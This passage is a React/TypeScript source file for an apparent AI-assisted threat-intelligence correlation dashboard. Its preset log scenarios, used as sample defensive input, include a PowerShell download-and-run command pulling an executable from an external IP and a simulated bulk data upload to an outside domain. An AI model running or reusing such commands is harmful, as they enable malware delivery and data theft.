import { useState, useEffect, useMemo, useRef } from "react";
import {
  Shield,
  AlertTriangle,
  Activity,
  Terminal,
  Cpu,
  Layers,
  Lock,
  Unlock,
  Globe,
  Search,
  FileText,
  PlusCircle,
  CheckCircle2,
  Play,
  Pause,
  RefreshCw,
  User,
  Server,
  TrendingUp,
  X,
  ExternalLink,
  Database,
  Hash,
  ArrowRight,
  ChevronRight,
  Info,
  Sparkles,
  Check,
  Zap,
} from "lucide-react";
import { Severity, IOCType, SecurityAlert, AttackCampaign, ThreatActor } from "./types";
import { mockAlerts, mockCampaigns, mockThreatActors, simulatedStreamLogs } from "./mockData";

export default function App() {
  // State for active views and references
  const [activeTab, setActiveTab] = useState<"dashboard" | "actors" | "logs">("dashboard");
  const [selectedCampaignId, setSelectedCampaignId] = useState<string>("camp-001");
  const [selectedNodeDetails, setSelectedNodeDetails] = useState<{ id: string; label: string; type: string; details?: string } | null>(null);

  // Ingestion & stream simulator states
  const [liveStream, setLiveStream] = useState<any[]>(simulatedStreamLogs);
  const [isStreamingEnabled, setIsStreamingEnabled] = useState<boolean>(true);
  const [streamCounter, setStreamCounter] = useState<number>(0);

  // Custom Threat Log ingestion playground states
  const [customLogsText, setCustomLogsText] = useState<string>("");
  const [systemContextValue, setSystemContextValue] = useState<string>("Target Sector: Logistics & Port Utilities");
  const [isAIAnalyzing, setIsAIAnalyzing] = useState<boolean>(false);
  const [aiError, setAiError] = useState<string | null>(null);
  const [aiHealth, setAiHealth] = useState<{ status: string; hasApiKey: boolean } | null>(null);

  // User-submitted campaigns (appended locally to state)
  const [campaigns, setCampaigns] = useState<AttackCampaign[]>(mockCampaigns);
  const [alerts, setAlerts] = useState<SecurityAlert[]>(mockAlerts);

  // Quick template scenarios for the analyzer panel
  const logScenarios = {
    ransomware: `[2026-06-08 12:05:01] INGEST - PHISHING GATEWAY: Spearphishing email blocked/alerted. Sender: secure-update@billing-dept-portal.com. Filename: Core_Logistics_Ledger.xlsm (md5=4a8e3f9a77cd5ac244a0e98f09faef4c). Recipient: assistant.c@port-logistics.org.
[2026-06-08 12:12:30] INGEST - EDR AUDIT: Process spawned on WS-CHLOE-LAPTOP. Target: Excel launched powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri http://185.247.72.128/srvhost -OutFile C:\\temp\\srvhost_enc.exe"
[2026-06-08 12:15:10] INGEST - FIREWALL: Outdated dynamic SSL handshake detected. Dest IP: 185.247.72.128 on port 443. Traffic Bytes: 14,800 sent.
[2026-06-08 12:20:45] INGEST - ACTIVE DIRECTORY: Compromised backup admin logins bypassed local group token checking from 10.0.4.15. User: admin.backup. Target: PROD-LOGISTICS-VM.
[2026-06-08 12:35:00] INGEST - EDR ACTION: Heavy CPU spike & randomized file extension appends (.conti / .ryuk) detected on network shares of server PROD-LOGISTICS-VM. Process: srvhost_enc.exe (hash=ffac3e4d693a8cf8becb71e19488a03c). dropping ransom note CONTI_README.txt.`,
    cloud: `[2026-06-08 09:12:00] CLOUD-TRAIL: API AssumeRole called inside AWS production VPC - role assumed: "IAM-Dev-Role-Assumed" originating from suspicious hosting provider IP address 203.0.113.88.
[2026-06-08 09:18:22] INTER-VPC SECURITY EVENT: Dev account token manipulated. Cross-account S3 resources systematically queried. Account ID: 881023948.
[2026-06-08 09:25:50] AWS-S3 LOGS: Action "GetObject" triggered for bucket "AWS-S3-BLUEPRINTS-VAULT" download of 45GB blueprint documents zip package. Endpoint: https://secure-dns-route.net/upload/sys-data.bin`,
    custom: `[Insert raw SIEM logs, firewall events, Windows logs, or custom forensic strings here for correlation modeling...]`
  };

  const handleSelectScenario = (key: "ransomware" | "cloud" | "custom") => {
    setCustomLogsText(logScenarios[key]);
  };

  // Check API health status and key presence
  useEffect(() => {
    fetch("/api/health")
      .then((res) => res.json())
      .then((data) => {
        setAiHealth(data);
      })
      .catch((_) => {
        setAiHealth({ status: "error", hasApiKey: false });
      });
  }, []);

  // Set default scenario text on load
  useEffect(() => {
    setCustomLogsText(logScenarios.ransomware);
  }, []);

  // Real-time SIEM logs stream via SSE
  useEffect(() => {
    if (!isStreamingEnabled) return;

    const eventSource = new EventSource("/api/stream/logs");

    eventSource.onmessage = (event) => {
      try {
        const data = JSON.parse(event.data);
        if (data.status === "connected") {
          console.log("SSE stream connected.");
          return;
        }
        setStreamCounter((prev) => prev + 1);
        setLiveStream((prev) => [data, ...prev.slice(0, 15)]);
      } catch (err) {
        console.error("Failed to parse SSE message", err);
      }
    };

    eventSource.onerror = (err) => {
      console.error("SSE stream error", err);
      eventSource.close();
    };

    return () => {
      eventSource.close();
    };
  }, [isStreamingEnabled]);

  // Handle live Gemini Cyber Correlation API
  const handleAICorrelate = async () => {
    if (customLogsText.trim() === "") {
      setAiError("Please supply security logs first.");
      return;
    }

    setIsAIAnalyzing(true);
    setAiError(null);

    try {
      const response = await fetch("/api/gemini/correlate", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          logs: customLogsText,
          systemContext: systemContextValue
        })
      });

      if (!response.ok) {
        const errorData = await response.json();
        throw new Error(errorData.error || "Failed to contact local correlation endpoint.");
      }

      const data = await response.json();

      // Propose a random new campaign model ID
      const newChampId = `camp-custom-${Date.now()}`;
      
      const newCampaign: AttackCampaign = {
        id: newChampId,
        name: data.campaignProposedName || "AI Extracted Campaign Trace",
        threatActor: "Detected Behavior / Multi-Source Override",
        confidence: 90,
        riskScore: data.tactics?.length > 4 ? 95 : 82,
        status: "active",
        initialAccess: data.tactics?.[0] || "Ingested log threat vector",
        persistence: "Backdoor file trigger verified",
        lateralMovement: "Internal access logs overlap",
        targetSector: systemContextValue || "Enterprise Network",
        summary: data.explanation || "A campaign automatically mapped and isolated from uploaded log transcripts.",
        aiExplanation: data.explanation,
        recommendedActions: data.recommendedActions || [
          "Scan targeted infrastructure for persistence tools",
          "Apply immediate domain context restrictions",
          "Isolate compromised entities from public proxy gateway ports"
        ],
        alertsCount: data.extractedAlerts?.length || 0,
        iocsCount: data.extractedAlerts?.reduce((acc: number, cur: any) => acc + (cur.iocs?.length || 0), 0) || 0,
        createdAt: new Date().toISOString(),
        ttps: data.tactics || ["T1134", "T1071"]
      };

      // Turn extracted structured alerts into SecurityAlert interfaces
      const mappedAlerts: SecurityAlert[] = (data.extractedAlerts || []).map((alt: any, idx: number) => ({
        id: alt.id || `alt-custom-${idx}-${Date.now()}`,
        title: alt.title || "Discovered Incident Action",
        sourceSystem: alt.sourceSystem || "Firewall",
        severity: alt.severity || Severity.HIGH,
        timestamp: alt.timestamp || new Date().toISOString(),
        description: alt.description || "Identified behavioral anomaly trace, correlated by system constraints.",
        iocs: alt.iocs || [],
        affectedAsset: alt.affectedAsset || "Unresolved Resource Network",
        actionTaken: alt.actionTaken || "alerted",
        user: alt.user,
        mitreTTPs: alt.mitreTTPs || []
      }));

      // Update campaigns and alerts list
      setCampaigns((prev) => [newCampaign, ...prev]);
      setAlerts((prev) => [...mappedAlerts, ...prev]);
      setSelectedCampaignId(newChampId);
      setActiveTab("dashboard");
      setSelectedNodeDetails({
        id: newChampId,
        label: newCampaign.name,
        type: "campaign",
        details: newCampaign.summary
      });

    } catch (err: any) {
      console.error(err);
      setAiError(err.message || "An unexpected network block occurred.");
    } finally {
      setIsAIAnalyzing(false);
    }
  };

  // Find currently active Campaign
  const activeCampaign = useMemo(() => {
    return campaigns.find((c) => c.id === selectedCampaignId) || campaigns[0];
  }, [campaigns, selectedCampaignId]);

  // Filter alerts belonging to the active campaign based on TTP / context match
  const filteredAlerts = useMemo(() => {
    if (selectedCampaignId === "camp-001") {
      // Return alerts targeted for ShadowLock (first 7 elements inside mock data)
      return alerts.filter((a) => a.id.startsWith("alt-00"));
    } else if (selectedCampaignId === "camp-002") {
      // Returns ArcticRift
      return alerts.filter((a) => a.id.startsWith("alt-10"));
    } else {
      // Custom AI generated maps
      // If custom, returns modern alerts that are NOT hardocded
      return alerts.filter((a) => a.id.includes("custom") || !a.id.match(/^alt-(00|10)/));
    }
  }, [alerts, selectedCampaignId]);

  // Dynamic SVG Orbit Cluster Generation (Deterministic, beautiful star layout)
  const graphData = useMemo(() => {
    const nodes: any[] = [];
    const edges: any[] = [];
    const width = 600;
    const height = 400;
    const cx = width / 2;
    const cy = height / 2;

    // 1. Center Node (The Active Threat Campaign itself)
    nodes.push({
      id: activeCampaign.id,
      label: activeCampaign.name.split(" ")[0] + " Theme",
      type: "campaign",
      severity: Severity.CRITICAL,
      x: cx,
      y: cy,
      details: `Active Campaign Profile: ${activeCampaign.name}. Linked to threat actor: ${activeCampaign.threatActor}.`
    });

    if (filteredAlerts.length === 0) {
      return { nodes, edges };
    }

    // 2. Inner Ring (Alerts Spaced around Center)
    const alertRadius = 110;
    filteredAlerts.forEach((alert, index) => {
      const angle = (index * 2 * Math.PI) / filteredAlerts.length;
      const x = cx + alertRadius * Math.cos(angle);
      const y = cy + alertRadius * Math.sin(angle);

      nodes.push({
        id: alert.id,
        label: alert.sourceSystem,
        type: "alert",
        severity: alert.severity,
        x,
        y,
        details: `[${alert.sourceSystem}] ${alert.title}: ${alert.description}. Resource: ${alert.affectedAsset}`
      });

      // Link alert to central Campaign Campaign
      edges.push({
        id: `edge-${activeCampaign.id}-${alert.id}`,
        source: activeCampaign.id,
        target: alert.id,
        label: "part_of"
      });
    });

    // 3. Outer Ring (Indicators / Assets extracted from alerts)
    const iocsMap = new Map<string, { type: string; value: string; parentAlerts: string[] }>();
    filteredAlerts.forEach((alert) => {
      // Add IOC nodes
      alert.iocs.forEach((ioc) => {
        const key = `${ioc.type}-${ioc.value}`;
        if (!iocsMap.has(key)) {
          iocsMap.set(key, {
            type: ioc.type,
            value: ioc.value,
            parentAlerts: []
          });
        }
        iocsMap.get(key)!.parentAlerts.push(alert.id);
      });

      // Add user credential/context nodes if present
      if (alert.user) {
        const userKey = `USER-${alert.user}`;
        if (!iocsMap.has(userKey)) {
          iocsMap.set(userKey, {
            type: "USER" as any,
            value: alert.user,
            parentAlerts: []
          });
        }
        iocsMap.get(userKey)!.parentAlerts.push(alert.id);
      }
    });

    const iocsList = Array.from(iocsMap.values());
    const iocRadius = 230;

    iocsList.forEach((ioc, index) => {
      const angle = (index * 2 * Math.PI) / iocsList.length;
      const x = cx + iocRadius * Math.cos(angle);
      const y = cy + iocRadius * Math.sin(angle);

      const iocId = `ioc-${ioc.type}-${ioc.value.replace(/\s+/g, "-").toLowerCase()}`;
      nodes.push({
        id: iocId,
        label: ioc.value.length > 14 ? `${ioc.value.substring(0, 11)}...` : ioc.value,
        type: ioc.type.toLowerCase(),
        x,
        y,
        details: `Indicator: [${ioc.type}] ${ioc.value}`
      });

      // Draw edges back to parent alerts
      ioc.parentAlerts.forEach((parentAlertId) => {
        edges.push({
          id: `edge-${parentAlertId}-${iocId}`,
          source: parentAlertId,
          target: iocId,
          label: "contains"
        });
      });
    });

    return { nodes, edges };
  }, [activeCampaign, filteredAlerts]);

  // Set default selection to Central Campaign profile
  useEffect(() => {
    if (activeCampaign) {
      setSelectedNodeDetails({
        id: activeCampaign.id,
        label: activeCampaign.name,
        type: "campaign",
        details: activeCampaign.summary
      });
    }
  }, [selectedCampaignId]);

  return (
    <div className="min-h-screen bg-slate-950 text-slate-100 flex flex-col font-sans selection:bg-teal-500 selection:text-slate-900 overflow-x-hidden">
      {/* Upper Navigation Control Room */}
      <header className="border-b border-slate-800 bg-slate-900/80 backdrop-blur-md sticky top-0 z-50 px-6 py-4">
        <div className="max-w-7xl mx-auto flex flex-col md:flex-row md:items-center md:justify-between gap-4">
          
          <div className="flex items-center gap-3">
            <div className="h-10 w-10 bg-gradient-to-br from-teal-500 to-emerald-600 rounded-lg flex items-center justify-center shadow-lg shadow-teal-500/10">
              <Shield className="h-5 w-5 text-slate-900 stroke-[2.5]" id="app-logo-shield" />
            </div>
            <div>
              <div className="flex items-center gap-2">
                <span className="font-semibold text-lg tracking-tight text-white">ThreatWeave</span>
                <span className="text-xs bg-slate-800 text-teal-400 px-2 py-0.5 rounded border border-teal-500/20 font-mono">
                  v1.2-AI
                </span>
              </div>
              <p className="text-slate-400 text-xs mt-0.5">
                Multi-Resource Cyber Threat Intelligence Correlation Engine
              </p>
            </div>
          </div>

          {/* Real-time Ingestion Stream Metrics */}
          <div className="flex flex-wrap items-center gap-4 text-xs">
            <div className="flex items-center gap-2 bg-slate-950 px-3 py-1.5 rounded-full border border-slate-800">
              <span className="relative flex h-2 w-2">
                {isStreamingEnabled && <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>}
                <span className={`relative inline-flex rounded-full h-2 w-2 ${isStreamingEnabled ? "bg-emerald-500" : "bg-slate-600"}`}></span>
              </span>
              <span className="text-slate-400">Stream Status:</span>
              <button 
                onClick={() => setIsStreamingEnabled(!isStreamingEnabled)}
                className="text-white hover:text-teal-400 font-mono font-medium focus:outline-none"
              >
                {isStreamingEnabled ? "LISTENING" : "OFFLINE"}
              </button>
            </div>

            <div className="flex items-center gap-2 bg-slate-950 px-3 py-1.5 rounded-full border border-slate-800 text-slate-400">
              <Activity className="h-3.5 w-3.5 text-indigo-400 animate-pulse" />
              <span>Ingested Logs: <strong className="text-slate-200 font-mono">{liveStream.length * 420 + streamCounter}</strong></span>
            </div>

            {/* AI Health Dashboard Indicator */}
            <div className="flex items-center gap-2 bg-slate-950 px-3 py-1.5 rounded-full border border-slate-800">
              <Sparkles className={`h-3.5 w-3.5 ${aiHealth?.hasApiKey ? "text-amber-400" : "text-slate-500"}`} />
              <span className="text-slate-400">Gemini Key:</span>
              <span className={`font-semibold ${aiHealth?.hasApiKey ? "text-green-400" : "text-amber-500"}`}>
                {aiHealth?.hasApiKey ? "ACTIVE" : "SIMULATED MODE"}
              </span>
            </div>
          </div>

        </div>
      </header>

      {/* Primary Container Layout */}
      <main className="max-w-7xl w-full mx-auto p-4 md:p-6 grid grid-cols-1 lg:grid-cols-12 gap-6 flex-1">
        
        {/* Left Hand Command Panel: Tabs Control (Bento-styled) */}
        <div className="lg:col-span-4 flex flex-col gap-6">

          {/* Navigation Tab Pickers */}
          <div className="bg-slate-900 border border-slate-800 p-1.5 rounded-xl flex gap-1 items-center">
            <button
              onClick={() => setActiveTab("dashboard")}
              className={`flex-1 py-2.5 rounded-lg text-xs font-semibold tracking-wide transition-all ${
                activeTab === "dashboard"
                  ? "bg-slate-800 text-teal-400 shadow-sm border-b border-teal-500/40"
                  : "text-slate-400 hover:text-white"
              }`}
            >
              Intelligence Room
            </button>
            <button
              onClick={() => setActiveTab("logs")}
              className={`flex-1 py-2.5 rounded-lg text-xs font-semibold tracking-wide transition-all ${
                activeTab === "logs"
                  ? "bg-slate-800 text-teal-400 shadow-sm border-b border-teal-500/40"
                  : "text-slate-400 hover:text-white"
              }`}
            >
              SIEM Log Ingestion
            </button>
            <button
              onClick={() => setActiveTab("actors")}
              className={`flex-1 py-2.5 rounded-lg text-xs font-semibold tracking-wide transition-all ${
                activeTab === "actors"
                  ? "bg-slate-800 text-teal-400 shadow-sm border-b border-teal-500/40"
                  : "text-slate-400 hover:text-white"
              }`}
            >
              APT Catalog
            </button>
          </div>

          {/* Tab Content Panels */}
          {activeTab === "dashboard" && (
            <>
              {/* Campaign selector list */}
              <div className="bg-slate-900 border border-slate-800 rounded-xl p-4 flex flex-col gap-3">
                <div className="flex items-center justify-between pb-2 border-b border-slate-800">
                  <div className="flex items-center gap-2">
                    <Layers className="h-4 w-4 text-emerald-400" />
                    <h3 className="font-semibold text-sm text-slate-100">Discovered Campaigns</h3>
                  </div>
                  <span className="text-xs text-slate-500 font-mono">
                    {campaigns.length} targets detected
                  </span>
                </div>

                <div className="flex flex-col gap-2 max-h-[220px] overflow-y-auto pr-1">
                  {campaigns.map((camp) => {
                    const isSelected = camp.id === selectedCampaignId;
                    return (
                      <button
                        key={camp.id}
                        onClick={() => setSelectedCampaignId(camp.id)}
                        className={`text-left p-3 rounded-lg border transition-all duration-200 ${
                          isSelected
                            ? "bg-teal-500/10 border-teal-500/40 text-teal-300"
                            : "bg-slate-950/40 border-slate-800 hover:border-slate-700 text-slate-300"
                        }`}
                      >
                        <div className="flex items-center justify-between gap-2">
                          <span className="font-semibold text-xs truncate max-w-[180px]">
                            {camp.name}
                          </span>
                          <span
                            className={`text-[10px] uppercase px-1.5 py-0.5 rounded font-bold font-mono ${
                              camp.riskScore >= 90
                                ? "bg-red-500/20 text-red-400"
                                : "bg-amber-500/20 text-amber-500"
                            }`}
                          >
                            Risk: {camp.riskScore}
                          </span>
                        </div>
                        <p className="text-[11px] text-slate-400 truncate mt-1">
                          Actor: {camp.threatActor}
                        </p>
                        <div className="flex items-center justify-between text-[10px] text-slate-500 font-mono mt-2 pt-2 border-t border-slate-800/60">
                          <span>Timeline matching {camp.alertsCount} logs</span>
                          <span>Conf: {camp.confidence}%</span>
                        </div>
                      </button>
                    );
                  })}
                </div>
              </div>

              {/* Triage Live Security Incident feeds */}
              <div className="bg-slate-900 border border-slate-800 rounded-xl p-4 flex flex-col flex-1">
                <div className="flex items-center justify-between pb-3 border-b border-slate-800">
                  <div className="flex items-center gap-2">
                    <Terminal className="h-4 w-4 text-rose-400" />
                    <span className="font-semibold text-sm text-slate-100">Live Ingested Feed Stream</span>
                  </div>
                  <span className="h-2 w-2 rounded-full bg-emerald-500 relative flex">
                    <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-60"></span>
                  </span>
                </div>

                <div className="text-[10px] text-slate-500 bg-slate-950/40 p-2.5 rounded border border-slate-800/50 leading-relaxed font-mono mt-3 mb-2">
                  To ingest a live log (PowerShell), run:<br/>
                  <code className="text-teal-400 select-all">Invoke-RestMethod -Uri "http://localhost:3001/api/ingest" -Method Post -ContentType "application/json" -Body '{`{"title": "Test Alert", "severity": "HIGH", "sourceSystem": "Firewall", "description": "Suspicious request", "iocs": "192.168.1.100"}`}'</code>
                </div>
                {/* Real-time Ingest List container */}
                <div className="flex-1 overflow-y-auto max-h-[380px] flex flex-col gap-2 pr-1 text-xs">
                  {liveStream.map((log, index) => {
                    const isCritical = log.severity === "CRITICAL" || log.severity === "HIGH";
                    return (
                      <div
                        key={index}
                        className="p-2.5 bg-slate-950/60 border border-slate-850 rounded-lg hover:border-slate-800 transition-all"
                      >
                        <div className="flex items-center justify-between mb-1 text-[10px]">
                          <span className="text-slate-500 font-mono">
                            {new Date(log.timestamp).toLocaleTimeString()}
                          </span>
                          <span
                            className={`px-1.5 py-0.2 rounded text-[9px] font-bold font-mono ${
                              log.severity === "CRITICAL"
                                ? "bg-red-500/20 text-red-400"
                                : log.severity === "HIGH"
                                ? "bg-rose-500/10 text-rose-400"
                                : log.severity === "MEDIUM"
                                ? "bg-amber-500/10 text-amber-500"
                                : "bg-sky-500/10 text-sky-400"
                            }`}
                          >
                            {log.severity}
                          </span>
                        </div>
                        <p className="font-semibold text-slate-200 mt-0.5 truncate text-[11px]">
                          {log.title}
                        </p>
                        <p className="text-slate-400 leading-relaxed text-[11px] mt-1 pr-1 font-mono">
                          {log.description}
                        </p>
                        <div className="mt-2 text-[10px] text-teal-400 font-mono bg-slate-900/50 p-1.5 rounded truncate border border-slate-800/40">
                          {log.iocs}
                        </div>
                      </div>
                    );
                  })}
                </div>
              </div>
            </>
          )}

          {activeTab === "logs" && (
            <div className="bg-slate-900 border border-slate-800 rounded-xl p-4 flex flex-col gap-4">
              <div className="flex items-center justify-between pb-2 border-b border-slate-800">
                <div className="flex items-center gap-2">
                  <Cpu className="h-4 w-4 text-amber-400 animate-spin-slow" />
                  <h3 className="font-semibold text-sm text-slate-100">AI Threat Ingest Hub</h3>
                </div>
                <span className="text-xs bg-slate-800 px-2 py-0.5 rounded text-amber-400 font-mono border border-amber-500/20">
                  Gemini API v3.5
                </span>
              </div>

              <div>
                <label className="block text-xs font-semibold text-slate-400 mb-2">
                  1. Select a Preset Attack Scenario template:
                </label>
                <div className="grid grid-cols-2 gap-2">
                  <button
                    onClick={() => handleSelectScenario("ransomware")}
                    className="py-1.5 px-2 bg-slate-950 border border-slate-800 rounded text-xs hover:border-slate-700 text-left text-slate-300 font-medium truncate flex items-center gap-1.5"
                  >
                    <div className="h-1.5 w-1.5 rounded-full bg-red-400"></div>
                    Conti Ransomware
                  </button>
                  <button
                    onClick={() => handleSelectScenario("cloud")}
                    className="py-1.5 px-2 bg-slate-950 border border-slate-800 rounded text-xs hover:border-slate-700 text-left text-slate-300 font-medium truncate flex items-center gap-1.5"
                  >
                    <div className="h-1.5 w-1.5 rounded-full bg-blue-400"></div>
                    AWS Cloud Leak
                  </button>
                </div>
              </div>

              <div>
                <label className="block text-xs font-semibold text-slate-400 mb-1.5">
                  2. Incident Context / Target Objective:
                </label>
                <input
                  type="text"
                  value={systemContextValue}
                  onChange={(e) => setSystemContextValue(e.target.value)}
                  className="w-full bg-slate-950 text-slate-200 border border-slate-800 rounded-lg p-2 text-xs focus:ring-1 focus:ring-teal-500 focus:outline-none font-mono"
                  placeholder="e.g. Host sector, security baseline, DNS profiles..."
                />
              </div>

              <div className="flex-1">
                <label className="block text-xs font-semibold text-slate-400 mb-1.5">
                  3. Raw SIEM / Syslog Transcript Input:
                </label>
                <textarea
                  value={customLogsText}
                  onChange={(e) => setCustomLogsText(e.target.value)}
                  className="w-full h-44 bg-slate-950 text-slate-300 border border-slate-800 rounded-lg p-2.5 text-xs font-mono leading-normal focus:ring-1 focus:ring-teal-500 focus:outline-none resize-none"
                  placeholder="Paste multi-system security logs here to trigger automated machine relationship modeling..."
                />
              </div>

              {aiError && (
                <div className="p-3 bg-red-500/10 border border-red-500/30 rounded-lg flex items-start gap-2">
                  <AlertTriangle className="h-4 w-4 text-red-400 shrink-0 mt-0.5" />
                  <p className="text-[11px] text-red-300 leading-normal">{aiError}</p>
                </div>
              )}

              <button
                onClick={handleAICorrelate}
                disabled={isAIAnalyzing || customLogsText.trim() === ""}
                className={`py-3 px-4 rounded-lg font-semibold text-xs tracking-wide shadow-md transition-all flex items-center justify-center gap-2 ${
                  isAIAnalyzing
                    ? "bg-slate-800 text-slate-500 cursor-not-allowed border border-slate-700"
                    : "bg-gradient-to-r from-teal-500 to-emerald-600 text-slate-950 hover:opacity-90 active:scale-[0.98] font-bold"
                }`}
              >
                {isAIAnalyzing ? (
                  <>
                    <RefreshCw className="h-4 w-4 animate-spin text-slate-500" />
                    Modeling Graph Matrix...
                  </>
                ) : (
                  <>
                    <Sparkles className="h-4 w-4 fill-slate-950" />
                    Execute AI Correlation Engine
                  </>
                )}
              </button>

              {!aiHealth?.hasApiKey && (
                <p className="text-[10px] text-slate-500 bg-slate-950/40 p-2.5 rounded border border-slate-800/50 leading-relaxed">
                  💡 <strong>Simulated Mode active:</strong> A fully responsive simulator analyzes custom inputs. To enable live full scale Gemini correlation models, supply a <strong>GEMINI_API_KEY</strong> inside your AI Studio Secrets panel.
                </p>
              )}
            </div>
          )}

          {activeTab === "actors" && (
            <div className="bg-slate-900 border border-slate-800 rounded-xl p-4 flex flex-col gap-4">
              <div className="pb-2 border-b border-slate-800">
                <h3 className="font-semibold text-sm text-slate-100 flex items-center gap-2">
                  <User className="h-4 w-4 text-indigo-400" />
                  Threat Actor Dossiers
                </h3>
                <p className="text-slate-400 text-xs mt-1">
                  Federated actor behavior indices from OSINT threat databases.
                </p>
              </div>

              <div className="flex flex-col gap-3 max-h-[500px] overflow-y-auto pr-1">
                {mockThreatActors.map((actor) => (
                  <div key={actor.id} className="p-3 bg-slate-950/60 border border-slate-800 rounded-lg">
                    <div className="flex items-center justify-between">
                      <span className="font-bold text-xs text-indigo-300">{actor.name}</span>
                      <span className="text-[10px] bg-slate-800 text-slate-400 px-1.5 py-0.5 rounded font-mono">
                        {actor.origin || "Unknown Origin"}
                      </span>
                    </div>

                    {actor.aliases && actor.aliases.length > 0 && (
                      <p className="text-[10px] text-slate-500 mt-1">
                        Aliases: {actor.aliases.join(", ")}
                      </p>
                    )}

                    <p className="text-[11px] text-slate-400 leading-normal mt-2">
                      {actor.description}
                    </p>

                    <div className="mt-3 pt-2.5 border-t border-slate-800/60">
                      <p className="text-[10px] font-semibold text-slate-300 uppercase tracking-wider mb-1">
                        Sectors Targetted:
                      </p>
                      <div className="flex flex-wrap gap-1">
                        {actor.targetSectors.map((sect) => (
                          <span
                            key={sect}
                            className="text-[9px] bg-slate-900 text-indigo-400 border border-indigo-900/30 px-1.5 py-0.5 rounded"
                          >
                            {sect}
                          </span>
                        ))}
                      </div>
                    </div>

                    <div className="mt-2.5">
                      <p className="text-[10px] font-semibold text-slate-300 uppercase tracking-wider mb-1 font-mono">
                        Signature TTPs:
                      </p>
                      <div className="flex flex-wrap gap-1">
                        {actor.observedTTPs.map((ttp) => (
                          <span
                            key={ttp}
                            className="text-[9px] bg-slate-900 text-emerald-400 border border-emerald-950/35 px-1.5 py-0.5 rounded font-mono"
                          >
                            {ttp}
                          </span>
                        ))}
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          )}

        </div>

        {/* Right Column Area: Graph Space & Campaign Analysis Indicators */}
        <div className="lg:col-span-8 flex flex-col gap-6">

          {/* Upper Dashboard Widget: Interactive Campaign Metadata Grid */}
          <div className="bg-slate-900 border border-slate-800 rounded-xl p-5 shadow-xl shadow-slate-950/10">
            <div className="flex flex-col md:flex-row md:items-center justify-between gap-4">
              <div>
                <div className="flex items-center gap-2 text-slate-400 text-xs uppercase font-semibold font-mono tracking-wider">
                  <span className="h-1.5 w-1.5 rounded-full bg-emerald-400"></span>
                  Correlated Intrusion Threat Vector Action
                </div>
                <h1 className="text-xl md:text-2xl font-bold text-white mt-1">
                  {activeCampaign.name}
                </h1>
              </div>

              <div className="flex items-center gap-3">
                <div className="bg-slate-950 border border-slate-800 rounded-lg p-2.5 min-w-[90px] text-center shadow-inner">
                  <div className="text-[10px] text-slate-500 font-semibold font-mono uppercase">
                    Risk Index
                  </div>
                  <div className="text-xl font-extrabold text-red-500 font-mono mt-0.5">
                    {activeCampaign.riskScore}%
                  </div>
                </div>

                <div className="bg-slate-950 border border-slate-800 rounded-lg p-2.5 min-w-[90px] text-center shadow-inner">
                  <div className="text-[10px] text-slate-500 font-semibold font-mono uppercase">
                    Confidence
                  </div>
                  <div className="text-xl font-extrabold text-teal-400 font-mono mt-0.5">
                    {activeCampaign.confidence}%
                  </div>
                </div>
              </div>
            </div>

            <p className="text-slate-350 text-xs md:text-sm leading-relaxed mt-4 bg-slate-950/50 p-3 rounded-lg border border-slate-800/40">
              {activeCampaign.summary}
            </p>

            <div className="grid grid-cols-1 md:grid-cols-4 gap-3 mt-4 text-xs font-mono">
              <div className="p-2.5 bg-slate-950/40 rounded-lg border border-slate-850">
                <span className="text-slate-500 block uppercase text-[10px]">Initial Access</span>
                <span className="text-slate-300 font-medium truncate block mt-0.5">{activeCampaign.initialAccess}</span>
              </div>
              <div className="p-2.5 bg-slate-950/40 rounded-lg border border-slate-850">
                <span className="text-slate-500 block uppercase text-[10px]">Persistence Mode</span>
                <span className="text-slate-300 font-medium truncate block mt-0.5">{activeCampaign.persistence}</span>
              </div>
              <div className="p-2.5 bg-slate-950/40 rounded-lg border border-slate-850">
                <span className="text-slate-500 block uppercase text-[10px]">Lateral Vector</span>
                <span className="text-slate-300 font-medium truncate block mt-0.5">{activeCampaign.lateralMovement}</span>
              </div>
              <div className="p-2.5 bg-slate-950/40 rounded-lg border border-slate-850">
                <span className="text-slate-500 block uppercase text-[10px]">Target Sector Focus</span>
                <span className="text-slate-300 font-medium truncate block mt-0.5">{activeCampaign.targetSector}</span>
              </div>
            </div>
          </div>

          {/* Middle Sandbox Panel: Interactive Graph Space */}
          <div className="bg-slate-900 border border-slate-800 rounded-xl overflow-hidden flex flex-col min-h-[440px] relative shadow-lg">
            
            {/* Graph Sandbox Overlay Header */}
            <div className="p-4 border-b border-slate-800 bg-slate-900/40 backdrop-blur flex items-center justify-between z-10">
              <div className="flex items-center gap-2">
                <div className="h-2 w-2 rounded-full bg-teal-400 animate-pulse"></div>
                <span className="text-xs font-semibold text-slate-100 uppercase tracking-wider font-mono">
                  Interactive Node Association Map
                </span>
              </div>
              <div className="text-[10px] text-slate-400 bg-slate-950 px-2 py-1 rounded border border-slate-850 font-mono">
                Showing {graphData.nodes.length} Elements | {graphData.edges.length} Connections
              </div>
            </div>

            {/* Core Interactive Graph Drawing (Deterministic Coordinate System SVG) */}
            <div className="flex-1 min-h-[350px] bg-slate-950/70 p-4 flex items-center justify-center relative overflow-hidden">
              
              {/* Technical Dot Grid Overlay */}
              <div className="absolute inset-0 pointer-events-none bg-[radial-gradient(#1e293b_1px,transparent_1px)] [background-size:16px_16px] opacity-40"></div>

              <svg
                width="100%"
                height="100%"
                viewBox="0 0 600 400"
                className="max-w-[600px] max-h-[400px] overflow-visible select-none"
              >
                <defs>
                  {/* Glowing Arrow Markers for edges */}
                  <marker
                    id="arrow"
                    viewBox="0 0 10 10"
                    refX="18"
                    refY="5"
                    markerWidth="6"
                    markerHeight="6"
                    orient="auto-start-reverse"
                  >
                    <path d="M 0 2 L 10 5 L 0 8 z" fill="#334155" />
                  </marker>
                  <marker
                    id="arrow-glowing"
                    viewBox="0 0 10 10"
                    refX="18"
                    refY="5"
                    markerWidth="6"
                    markerHeight="6"
                    orient="auto-start-reverse"
                  >
                    <path d="M 0 2 L 10 5 L 0 8 z" fill="#14b8a6" />
                  </marker>

                  {/* Core glowing aura filters */}
                  <filter id="glow" x="-20%" y="-20%" width="140%" height="140%">
                    <feGaussianBlur stdDeviation="3" result="blur" />
                    <feComposite in="SourceGraphic" in2="blur" operator="over" />
                  </filter>
                </defs>

                {/* Draw connecting edges */}
                {graphData.edges.map((edge) => {
